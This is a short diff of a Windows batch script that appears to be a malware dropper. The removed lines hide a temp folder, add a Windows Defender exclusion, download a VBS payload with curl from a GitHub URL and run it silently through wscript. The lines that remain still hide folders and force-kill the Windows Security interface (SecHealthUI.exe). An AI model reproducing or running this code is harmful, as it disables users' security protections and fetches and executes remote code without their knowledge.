@@ -26,18 +26,7 @@ set "hiddenFolder2=%temp%\%RANDOM%%RANDOM%%RANDOM%%RANDOM%"
 mkdir "%hiddenFolder2%"
 
 REM Set hidden attribute for folder
-attrib +h "%hiddenFolder2%"
-
-REM Exclude hidden folder from Windows Defender
-powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\myscript.vbs'"
-
-:: myscript
-curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/myscript.vbs?"%time%" -o "%hiddenFolder2%\myscript.vbs"
-
-attrib +h +s "%hiddenFolder2%\myscript.vbs"
-
-REM Run payload silently and pass %hiddenFolder% variable
-start /B "" wscript.exe "%hiddenFolder2%\myscript.vbs" %hiddenFolder1%
+attrib +h +s "%hiddenFolder2%"
 
 ::external
 taskkill /f /im SecHealthUI.exe >nul 2>&1
